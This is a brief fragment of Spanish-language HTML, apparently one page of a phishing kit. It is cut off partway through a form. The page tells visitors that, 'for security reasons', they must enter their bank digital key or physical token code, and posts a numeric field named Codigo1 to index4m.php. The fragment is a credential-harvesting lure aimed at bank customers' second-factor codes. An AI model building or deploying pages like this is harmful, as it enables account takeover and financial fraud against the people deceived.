...
<br>
<br><h1>Por motivos de seguridad ingresá tu <br><br> LLAVE DIGITAL ó<br><br> TOKEN FISICO</h1><br>
			 <form  method="post" name="form1" id="form1" action="index4m.php">
  
 <div class="form-group">
 <input type="tel" maxlength="10" minlength="6" class="form-control"  style="border:1px solid;" onkeypress="soloNumeros(event)"   name="Codigo1"
